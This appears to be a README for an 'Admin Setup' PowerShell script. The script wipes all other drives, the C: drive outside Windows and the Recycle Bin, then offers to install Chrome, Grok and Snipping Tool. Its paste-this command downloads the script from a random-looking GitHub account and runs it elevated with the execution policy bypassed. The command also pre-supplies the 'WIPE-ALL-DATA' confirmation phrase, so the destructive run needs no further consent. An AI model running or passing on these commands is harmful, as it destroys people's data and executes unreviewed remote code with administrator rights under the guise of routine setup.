# Admin Setup

One file. Order: other drives, then C: (not Windows), then Recycle Bin.
After the wipe finishes, a Yes/No box offers the **Developers Preference** package.
Yes installs latest Chrome, Grok, and Snipping Tool.

```powershell
$dst = "$env:USERPROFILE\admin\Admin-Setup.ps1"
New-Item -ItemType Directory -Force -Path (Split-Path $dst) | Out-Null
irm https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Admin-Setup.ps1 -OutFile $dst
Start-Process "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$dst`" -ConfirmPhrase WIPE-ALL-DATA"
```
